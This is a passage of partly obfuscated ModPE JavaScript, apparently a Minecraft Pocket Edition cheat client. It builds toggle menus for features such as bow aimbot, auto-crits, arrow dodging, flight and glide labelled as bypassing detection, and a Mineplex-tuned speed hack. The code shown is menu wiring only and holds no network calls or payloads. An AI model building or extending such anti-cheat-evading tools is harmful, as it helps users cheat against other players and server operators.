                                grapples['setTextSize'](15);
                                grapples['setBackground'](module);
                                grapples['getBackground']()['setAlpha'](120);
                                grapples['setChecked'](grappleed);
                                grapples['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!grappleed) {
                                            grappless = true;
                                            grappleed = true
                                            grapples['setBackground'](bg);
                                        } else {
                                            grappless = false;
                                            grappleed = false
                                            grapples['setBackground'](module);
                                        };
                                        grapples['setChecked'](grappleed)
                                    }
                                }));
                                _0x2bf6x147['addView'](grapples);
                                var ghosthands = new Switch(ctx);
                                ghosthands['setText']('点击破坏');
                                ghosthands['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                ghosthands['setPadding'](10, 3, 3, 3);
                                ghosthands['setTextSize'](15);
                                ghosthands['setBackground'](module);
                                ghosthands['getBackground']()['setAlpha'](120);
                                ghosthands['setChecked'](ghosthanded);
                                ghosthands['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!ghosthanded) {
                                            ghosthandss = true;
                                            ghosthanded = true;
                                            fctoast('用手点击方块，然后破坏，注意方块不会消失哦')
                                            ghosthands['setBackground'](bg);
                                        } else {
                                            ghosthandss = false;
                                            ghosthanded = false
                                            ghosthands['setBackground'](module);
                                        };
                                        ghosthands['setChecked'](ghosthanded)
                                    }
                                }));
                                _0x2bf6x147['addView'](ghosthands);
                                var criticalss = new Switch(ctx);


                                criticalss['setText']('刀刀暴击');
                                criticalss['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                criticalss['setPadding'](10, 3, 3, 3);
                                criticalss['setTextSize'](15);
                                criticalss['setBackground'](module);
                                criticalss['getBackground']()['setAlpha'](120);
                                criticalss['setChecked'](criticalsed);
                                criticalss['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!criticalsed) {
                                            criticales = true;
                                            criticalsed = true
                                            criticalss['setBackground'](bg);
                                        } else {
                                            criticales = false;
                                            criticalsed = false
                                            criticalss['setBackground'](module);
                                        };
                                        criticalss['setChecked'](criticalsed)
                                    }
                                }));
                                _0x2bf6x147['addView'](criticalss);
                                var escapes = new Switch(ctx);
                                escapes['setText']('闪现');
                                escapes['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                escapes['setPadding'](10, 3, 3, 3);
                                escapes['setTextSize'](15);
                                escapes['setBackground'](module);
                                escapes['getBackground']()['setAlpha'](120);
                                escapes['setChecked'](escapeed);
                                escapes['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!escapeed) {
                                            showEscapeBtn();
                                            escapeed = true
                                            escapes['setBackground'](bg);
                                        } else {
                                            GUIs['dismiss']();
                                            escapeed = false
                                            escapes['setBackground'](module);
                                        };
                                        escapes['setChecked'](escapeed)
                                    }
                                }));
                                _0x2bf6x147['addView'](escapes);
                                var arrowdodges = new Switch(ctx);
                                arrowdodges['setText']('自动躲箭');
                                arrowdodges['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                arrowdodges['setPadding'](10, 3, 3, 3);
                                arrowdodges['setTextSize'](15);
                                arrowdodges['setBackground'](module);
                                arrowdodges['getBackground']()['setAlpha'](120);
                                arrowdodges['setChecked'](arrowdodgeed);
                                arrowdodges['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!arrowdodgeed) {
                                            arrowdodgess = true;
                                            arrowdodgeed = true;
                                            fctoast('当有箭靠进你的时候，可以自动躲避')
                                            arrowdodges['setBackground'](bg);
                                        } else {
                                            arrowdodgess = false;
                                            arrowdodgeed = false
                                            arrowdodges['setBackground'](module);
                                        };
                                        arrowdodges['setChecked'](arrowdodgeed)
                                    }
                                }));
                                _0x2bf6x147['addView'](arrowdodges);
                                var behindhits = new Switch(ctx);
                                behindhits['setText']('快速攻击');
                                behindhits['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                behindhits['setPadding'](10, 3, 3, 3);
                                behindhits['setTextSize'](15);
                                behindhits['setBackground'](module);
                                behindhits['getBackground']()['setAlpha'](120);
                                behindhits['setChecked'](behindhited);
                                behindhits['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!behindhited) {
                                            behindhitss = true;
                                            behindhited = true
                                            behindhits['setBackground'](bg);
                                        } else {
                                            behindhitss = false;
                                            behindhited = false
                                            behindhits['setBackground'](module);
                                        };
                                        behindhits['setChecked'](behindhited)
                                    }
                                }));
                                _0x2bf6x147['addView'](behindhits);
                                var bowaimbots = new Switch(ctx);
                                bowaimbots['setText']('自瞄弓');
                                bowaimbots['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                bowaimbots['setPadding'](10, 3, 3, 3);
                                bowaimbots['setTextSize'](15);
                                bowaimbots['setBackground'](module);
                                bowaimbots['getBackground']()['setAlpha'](120);
                                bowaimbots['setChecked'](bowaimboted);
                                bowaimbots['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!bowaimboted) {
                                            bowaimboted = true;
                                            bowaimbotss = true
                                            bowaimbots['setBackground'](bg);
                                        } else {
                                            bowaimboted = false;
                                            bowaimbotss = false
                                            bowaimbots['setBackground'](module);
                                        };
                                        bowaimbots['setChecked'](bowaimboted)
                                    }
                                }));
                                _0x2bf6x147['addView'](bowaimbots);
                                var snipers = new Switch(ctx);
                                snipers['setText']('自瞄弓[专业版]');
                                snipers['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                snipers['setPadding'](10, 3, 3, 3);
                                snipers['setTextSize'](15);
                                snipers['setBackground'](module);
                                snipers['getBackground']()['setAlpha'](120);
                                snipers['setChecked'](snipered);
                                snipers['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!snipered) {
                                            sniperss = true;
                                            snipered = true
                                            fctoast('拿起弓箭自动放大画面，进行射击')
                                            snipers['setBackground'](bg);
                                        } else {
                                            ModPE['resetFov']();
                                            sniperss = false;
                                            snipered = false
                                            snipers['setBackground'](module);
                                        };
                                        snipers['setChecked'](snipered)
                                    }
                                }));
                                _0x2bf6x147['addView'](snipers);
                                var autoswords = new Switch(ctx);
                                autoswords['setText']('自动切剑');
                                autoswords['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                autoswords['setPadding'](10, 3, 3, 3);
                                autoswords['setTextSize'](15);
                                autoswords['setBackground'](module);
                                autoswords['getBackground']()['setAlpha'](120);
                                autoswords['setChecked'](autosworded);
                                autoswords['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!autosworded) {
                                            autoswordss = true;
                                            autosworded = true
                                            autoswords['setBackground'](bg);
                                        } else {
                                            autoswordss = false;
                                            autosworded = false
                                            autoswords['setBackground'](module);
                                        };
                                        autoswords['setChecked'](autosworded)
                                    }
                                }));
                                _0x2bf6x147['addView'](autoswords);
                                menu1 = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 4, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']());
                                menu1['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                                menu1['showAtLocation'](ctx['getWindow']()['getDecorView'](), 1, 0, 0)
                            } catch (error) {
                                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
                            }
                        }
                    }))
                }
                var _0x2bf6x14f = new TextView(ctx);
                _0x2bf6x14f['setText']('移动');
                _0x2bf6x14f['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x14f['setTextSize'](24);
                _0x2bf6x14f['setBackground'](theme);
                _0x2bf6x14f['getBackground']()['setAlpha'](100);
                _0x2bf6x14f['setGravity'](Gravity.CENTER);
                _0x2bf6x14f['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x150();
                        exitmotion();
                        if (menu != null && menu['isShowing']()) {
                            menu['dismiss']()
                        };
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        };
                        exitUI['dismiss']()
                    }
                }));
                _0x2bf6x147['addView'](_0x2bf6x14f);

                function _0x2bf6x150() {
                    ctx['runOnUiThread'](new Runnable({
                        run: function() {
                            try {
                                var _0x2bf6x147 = new LinearLayout(ctx);
                                var _0x2bf6x148 = new ScrollView(ctx);
                                var _0x2bf6x149 = new LinearLayout(ctx);
                                _0x2bf6x147['setOrientation'](1);
                                _0x2bf6x147['setBackground'](theme);
                                _0x2bf6x147['getBackground']()['setAlpha'](120);
                                _0x2bf6x149['setOrientation'](1);
                                _0x2bf6x148['addView'](_0x2bf6x147);
                                _0x2bf6x149['addView'](_0x2bf6x148);
                                var _0x2bf6x151 = new TextView(ctx);
                                _0x2bf6x151['setTextSize'](20);
                                _0x2bf6x151['setText']('-| 移动 |-');
                                _0x2bf6x151['setTextColor'](android['graphics']['Color'].MAGENTA);
                                _0x2bf6x151['setBackgroundDrawable'](new ColorDrawable(Color.BLACK));
                                _0x2bf6x151['getBackground']()['setAlpha'](120);
                                _0x2bf6x151['setGravity'](Gravity.CENTER);
                                _0x2bf6x147['addView'](_0x2bf6x151);

                                var inpvpfly = new Switch(ctx);
                                inpvpfly['setText']('Inpvp飞行');
                                inpvpfly['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                inpvpfly['setPadding'](10, 3, 3, 3);
                                inpvpfly['setTextSize'](15);
                                inpvpfly['setBackground'](module);
                                inpvpfly['getBackground']()['setAlpha'](120);
                                inpvpfly['setChecked'](inpvpflyed);
                                inpvpfly['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!inpvpflyed) {
                                            inpvpflys = true;
                                            inpvpflyed = true
                                        } else {
                                            inpvpflys = false;
                                            inpvpflyed = false
                                        };
                                        inpvpfly['setChecked'](inpvpflyed)
                                    }
                                }));
                                _0x2bf6x147['addView'](inpvpfly);

                                var mineplexspeed = new Switch(ctx);
                                mineplexspeed['setText']('速度增加');
                                mineplexspeed['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                mineplexspeed['setPadding'](10, 3, 3, 3);
                                mineplexspeed['setTextSize'](15);
                                mineplexspeed['setBackground'](module);
                                mineplexspeed['getBackground']()['setAlpha'](120);
                                mineplexspeed['setChecked'](mineplexspeeded);
                                mineplexspeed['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!mineplexspeeded) {
                                            mineplexspeeds = true;
                                            mineplexspeeded = true
                                            ModPE['setGameSpeed'](48)
                                            fctoast('随枫吖:和Mineplex速度一样(如果反作弊更新后，就不可以了)')
                                        } else {
                                            mineplexspeeds = false;
                                            mineplexspeeded = false
                                            ModPE['setGameSpeed'](20)
                                        };
                                        mineplexspeed['setChecked'](mineplexspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](mineplexspeed);

                                var mineplexfly = new Switch(ctx);
                                mineplexfly['setText']('飞行[绕过检测]');
                                mineplexfly['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                mineplexfly['setPadding'](10, 3, 3, 3);
                                mineplexfly['setTextSize'](15);
                                mineplexfly['setBackground'](module);
                                mineplexfly['getBackground']()['setAlpha'](120);
                                mineplexfly['setChecked'](mineplexflyed);
                                mineplexfly['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!mineplexflyed) {
                                            mineplexflys = true;
                                            mineplexflyed = true
                                            fctoast('随枫吖:和Mineplex飞行一样(这是高级版的飞行哦)')
                                        } else {
                                            mineplexflys = false;
                                            mineplexflyed = false
                                        };
                                        mineplexfly['setChecked'](mineplexflyed)
                                    }
                                }));
                                _0x2bf6x147['addView'](mineplexfly);

                                var glides = new Switch(ctx);
                                glides['setText']('滑行[缓慢下降]');
                                glides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                glides['setPadding'](10, 3, 3, 3);
                                glides['setTextSize'](15);
                                glides['setBackground'](module);
                                glides['getBackground']()['setAlpha'](120);
                                glides['setChecked'](glideed);
                                glides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!glideed) {
                                            glidess = true;
                                            glideed = true;
                                        } else {
                                            glidess = false;
                                            glideed = false
                                        };
                                        glides['setChecked'](glideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](glides);
                                var ndglides = new Switch(ctx);
                                ndglides['setText']('滑行[永不向下]');
                                ndglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                ndglides['setPadding'](10, 3, 3, 3);
                                ndglides['setTextSize'](15);
                                ndglides['setBackground'](module);
                                ndglides['getBackground']()['setAlpha'](120);
                                ndglides['setChecked'](ndglideed);
                                ndglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!ndglideed) {
                                            ndglidess = true;
                                            ndglideed = true
                                        } else {
                                            ndglidess = false;
                                            ndglideed = false
                                        };
                                        ndglides['setChecked'](ndglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](ndglides);
                                var bypassglides = new Switch(ctx);
                                bypassglides['setText']('滑行[绕过检测]');
                                bypassglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                bypassglides['setPadding'](10, 3, 3, 3);
                                bypassglides['setTextSize'](15);
                                bypassglides['setBackground'](module);
                                bypassglides['getBackground']()['setAlpha'](120);
                                bypassglides['setChecked'](bypassglideed);
                                bypassglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!bypassglideed) {
                                            bypassglidess = true;
                                            bypassglideed = true
                                        } else {
                                            bypassglidess = false;
                                            bypassglideed = false
                                        };
                                        bypassglides['setChecked'](bypassglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](bypassglides);
                                var sglides = new Switch(ctx);
                                sglides['setText']('滑行[加速下降]');
                                sglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                sglides['setPadding'](10, 3, 3, 3);
                                sglides['setTextSize'](15);
                                sglides['setBackground'](module);
                                sglides['getBackground']()['setAlpha'](120);
                                sglides['setChecked'](sglideed);
                                sglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!sglideed) {
                                            sglidess = true;
                                            sglideed = true
                                        } else {
                                            sglidess = false;
                                            sglideed = false
                                        };
                                        sglides['setChecked'](sglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](sglides);
                                var dmgglides = new Switch(ctx);
                                dmgglides['setText']('滑行[缓慢下降]');
                                dmgglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                dmgglides['setPadding'](10, 3, 3, 3);
                                dmgglides['setTextSize'](15);
                                dmgglides['setBackground'](module);
                                dmgglides['getBackground']()['setAlpha'](120);
                                dmgglides['setChecked'](dmgglideed);
                                dmgglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!dmgglideed) {
                                            dmgglidess = true;
                                            dmgglideed = true
                                        } else {
                                            dmgglidess = false;
                                            dmgglideed = false
                                        };
                                        dmgglides['setChecked'](dmgglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](dmgglides);
                                var upglides = new Switch(ctx);
                                upglides['setText']('滑行[缓慢上升]');
                                upglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                upglides['setPadding'](10, 3, 3, 3);
                                upglides['setTextSize'](15);
                                upglides['setBackground'](module);
                                upglides['getBackground']()['setAlpha'](120);
                                upglides['setChecked'](upglideed);
                                upglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!upglideed) {
                                            upglidess = true;
                                            upglideed = true
                                        } else {
                                            upglidess = false;
                                            upglideed = false
                                        };
                                        upglides['setChecked'](upglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](upglides);
                                var airjumps = new Switch(ctx);
                                airjumps['setText']('空中跳跃');
                                airjumps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                airjumps['setPadding'](10, 3, 3, 3);
                                airjumps['setTextSize'](15);
                                airjumps['setBackground'](module);
                                airjumps['getBackground']()['setAlpha'](120);
                                airjumps['setChecked'](airjumped);
                                airjumps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!airjumped) {
                                            showJumpBtn();
                                            airjumped = true;
                                            fctoast('点击右下角的"枫"字即可')
                                        } else {
                                            GUIj['dismiss']();
                                            airjumped = false
                                        };
                                        airjumps['setChecked'](airjumped)
                                    }
                                }));
                                _0x2bf6x147['addView'](airjumps);
                                var highjumps = new Switch(ctx);
                                highjumps['setText']('高跳');
                                highjumps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                highjumps['setPadding'](10, 3, 3, 3);
                                highjumps['setTextSize'](15);
                                highjumps['setBackground'](module);
                                highjumps['getBackground']()['setAlpha'](120);
                                highjumps['setChecked'](highjumped);
                                highjumps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!highjumped) {
                                            highjumpss = true;
                                            highjumped = true
                                        } else {
                                            highjumpss = false;
                                            highjumped = false
                                        };
                                        highjumps['setChecked'](highjumped)
                                    }
                                }));
                                _0x2bf6x147['addView'](highjumps);
                                var hitjumps = new Switch(ctx);
                                hitjumps['setText']('攻击跳跃');
                                hitjumps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                hitjumps['setPadding'](10, 3, 3, 3);
                                hitjumps['setTextSize'](15);
                                hitjumps['setBackground'](module);
                                hitjumps['getBackground']()['setAlpha'](120);
                                hitjumps['setChecked'](hitjumped);
                                hitjumps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!hitjumped) {
                                            hitjumpss = true;
                                            hitjumped = true
                                        } else {
                                            hitjumpss = false;
                                            hitjumped = false
                                        };
                                        hitjumps['setChecked'](hitjumped)
                                    }
                                }));
                                _0x2bf6x147['addView'](hitjumps);
                                var tapjumps = new Switch(ctx);
                                tapjumps['setText']('点击跳跃');
                                tapjumps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                tapjumps['setPadding'](10, 3, 3, 3);
                                tapjumps['setTextSize'](15);
                                tapjumps['setBackground'](module);
                                tapjumps['getBackground']()['setAlpha'](120);
                                tapjumps['setChecked'](tapjumped);
                                tapjumps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!tapjumped) {
                                            tapjumpss = true;
                                            tapjumped = true
                                        } else {
                                            tapjumpss = false;
                                            tapjumped = false
                                        };
                                        tapjumps['setChecked'](tapjumped)
                                    }
                                }));
                                _0x2bf6x147['addView'](tapjumps);
                                var longhops = new Switch(ctx);
                                longhops['setText']('兔子跳');
                                longhops['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                longhops['setPadding'](10, 3, 3, 3);
                                longhops['setTextSize'](15);
                                longhops['setBackground'](module);
                                longhops['getBackground']()['setAlpha'](120);
                                longhops['setChecked'](longhoped);
                                longhops['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!longhoped) {
                                            longhopss = true;
                                            longhoped = true
                                        } else {
                                            longhopss = false;
                                            longhoped = false;
                                            lhtick = 0
                                        };
                                        longhops['setChecked'](longhoped)
                                    }
                                }));
                                _0x2bf6x147['addView'](longhops);
                                var speeds = new Switch(ctx);
                                speeds['setText']('变速齿轮');
                                speeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                speeds['setPadding'](10, 3, 3, 3);
                                speeds['setTextSize'](15);
                                speeds['setBackground'](module);
                                speeds['getBackground']()['setAlpha'](120);
                                speeds['setChecked'](speeded);
                                speeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!speeded) {
                                            speedss = true;
                                            speeded = true
                                        } else {
                                            speedss = false;
                                            speeded = false
                                        };
                                        speeds['setChecked'](speeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](speeds);
                                var zoomspeeds = new Switch(ctx);
                                zoomspeeds['setText']('疾跑速度');
                                zoomspeeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                zoomspeeds['setPadding'](10, 3, 3, 3);
                                zoomspeeds['setTextSize'](15);
                                zoomspeeds['setBackground'](module);
                                zoomspeeds['getBackground']()['setAlpha'](120);
                                zoomspeeds['setChecked'](zoomspeeded);
                                zoomspeeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!zoomspeeded) {
                                            zoomspeedss = true;
                                            zoomspeeded = true
                                        } else {
                                            zoomspeedss = false;
                                            zoomspeeded = false
                                        };
                                        zoomspeeds['setChecked'](zoomspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](zoomspeeds);
                                var jumpspeeds = new Switch(ctx);
                                jumpspeeds['setText']('持续跳[加速]');
                                jumpspeeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                jumpspeeds['setPadding'](10, 3, 3, 3);
                                jumpspeeds['setTextSize'](15);
                                jumpspeeds['setBackground'](module);
                                jumpspeeds['getBackground']()['setAlpha'](120);
                                jumpspeeds['setChecked'](jumpspeeded);
                                jumpspeeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!jumpspeeded) {
                                            jumpspeedss = true;
                                            jumpspeeded = true
                                        } else {
                                            jumpspeedss = false;
                                            jumpspeeded = false
                                        };
                                        jumpspeeds['setChecked'](jumpspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](jumpspeeds);
                                var cspeeds = new Switch(ctx);
                                cspeeds['setText']('潜行速度');
                                cspeeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                cspeeds['setPadding'](10, 3, 3, 3);
                                cspeeds['setTextSize'](15);
                                cspeeds['setBackground'](module);
                                cspeeds['getBackground']()['setAlpha'](120);
                                cspeeds['setChecked'](cspeeded);
                                cspeeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!cspeeded) {
                                            cspeedss = true;
                                            cspeeded = true
                                        } else {
                                            cspeedss = false;
                                            cspeeded = false
                                        };
                                        cspeeds['setChecked'](cspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](cspeeds);
                                var lbsgspeeds = new Switch(ctx);
                                lbsgspeeds['setText']('LB速度');
                                lbsgspeeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                lbsgspeeds['setPadding'](10, 3, 3, 3);
                                lbsgspeeds['setTextSize'](15);
                                lbsgspeeds['setBackground'](module);
                                lbsgspeeds['getBackground']()['setAlpha'](120);
                                lbsgspeeds['setChecked'](lbsgspeeded);
                                lbsgspeeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!lbsgspeeded) {
                                            lbsgspeedss = true;
                                            lbsgspeeded = true
                                        } else {
                                            lbsgspeedss = false;
                                            lbsgspeeded = false;
                                            ModPE['setGameSpeed'](20)
                                        };
                                        lbsgspeeds['setChecked'](lbsgspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](lbsgspeeds);
                                var follows = new Switch(ctx);
                                follows['setText']('跟随玩家');
                                follows['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                follows['setPadding'](10, 3, 3, 3);
                                follows['setTextSize'](15);
                                follows['setBackground'](module);
                                follows['getBackground']()['setAlpha'](120);
                                follows['setChecked'](followed);
                                follows['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!followed) {
                                            followss = true;
                                            followed = true
                                        } else {
                                            followss = false;
                                            followed = false
                                        };
                                        follows['setChecked'](followed)
                                    }
                                }));
                                _0x2bf6x147['addView'](follows);
                                var autowalks = new Switch(ctx);
                                autowalks['setText']('自动行走');
                                autowalks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                autowalks['setPadding'](10, 3, 3, 3);
                                autowalks['setTextSize'](15);
                                autowalks['setBackground'](module);
                                autowalks['getBackground']()['setAlpha'](120);
                                autowalks['setChecked'](autowalked);
                                autowalks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!autowalked) {
                                            autowalkss = true;
                                            autowalked = true
                                        } else {
                                            autowalkss = false;
                                            autowalked = false
                                        };
                                        autowalks['setChecked'](autowalked)
                                    }
                                }));
                                _0x2bf6x147['addView'](autowalks);
                                var jetpacks = new Switch(ctx);
                                jetpacks['setText']('喷气背包');
                                jetpacks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                jetpacks['setPadding'](10, 3, 3, 3);
                                jetpacks['setTextSize'](15);
                                jetpacks['setBackground'](module);
                                jetpacks['getBackground']()['setAlpha'](120);
                                jetpacks['setChecked'](jetpacked);
                                jetpacks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!jetpacked) {
                                            jetpackss = true;
                                            jetpacked = true
                                            fctoast('随枫吖:你的指针指向哪就飞向哪')
                                        } else {
                                            jetpackss = false;
                                            jetpacked = false
                                        };
                                        jetpacks['setChecked'](jetpacked)
                                    }
                                }));
                                _0x2bf6x147['addView'](jetpacks);
                                var steps = new Switch(ctx);
                                steps['setText']('爬墙[瞬移]');
                                steps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                steps['setPadding'](10, 3, 3, 3);
                                steps['setTextSize'](15);
                                steps['setBackground'](module);
                                steps['getBackground']()['setAlpha'](120);
                                steps['setChecked'](steped);
                                steps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!steped) {
                                            stepss = true;
                                            steped = true
                                        } else {
                                            stepss = false;
                                            steped = false
                                        };
                                        steps['setChecked'](steped)
                                    }
                                }));
                                _0x2bf6x147['addView'](steps);
                                var csteps = new Switch(ctx);
                                csteps['setText']('爬墙[平滑]');
                                csteps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                csteps['setPadding'](10, 3, 3, 3);
                                csteps['setTextSize'](15);
                                csteps['setBackground'](module);
                                csteps['getBackground']()['setAlpha'](120);
                                csteps['setChecked'](csteped);
                                csteps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!csteped) {
                                            cstepss = true;
                                            csteped = true
                                        } else {
                                            cstepss = false;
                                            csteped = false
                                        };
                                        csteps['setChecked'](csteped)
                                    }
                                }));
                                _0x2bf6x147['addView'](csteps);
                                menu2 = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 4, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']());
                                menu2['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                                menu2['showAtLocation'](ctx['getWindow']()['getDecorView'](), 1, 0, 0)
                            } catch (error) {
                                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
                            }
                        }
                    }))
                }
                var _0x2bf6x152 = new TextView(ctx);
                _0x2bf6x152['setText']('玩家');
                _0x2bf6x152['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x152['setTextSize'](24);
                _0x2bf6x152['setBackground'](theme);
                _0x2bf6x152['getBackground']()['setAlpha'](100);
                _0x2bf6x152['setGravity'](Gravity.CENTER);
                _0x2bf6x152['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x153();
                        exitplayer();
                        if (menu != null && menu['isShowing']()) {
                            menu['dismiss']()
                        };
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        };
                        exitUI['dismiss']()
                    }
                }));
                _0x2bf6x147['addView'](_0x2bf6x152);

                function _0x2bf6x153() {
                    ctx['runOnUiThread'](new Runnable({
                        run: function() {
                            try {
                                var _0x2bf6x147 = new LinearLayout(ctx);
                                var _0x2bf6x148 = new ScrollView(ctx);
                                var _0x2bf6x149 = new LinearLayout(ctx);
                                _0x2bf6x147['setOrientation'](1);
                                _0x2bf6x147['setBackground'](theme);
                                _0x2bf6x147['getBackground']()['setAlpha'](120);
                                _0x2bf6x149['setOrientation'](1);
                                _0x2bf6x148['addView'](_0x2bf6x147);
                                _0x2bf6x149['addView'](_0x2bf6x148);
                                var _0x2bf6x154 = new TextView(ctx);
                                _0x2bf6x154['setTextSize'](20);
                                _0x2bf6x154['setText']('-| 玩家 |-');
                                _0x2bf6x154['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
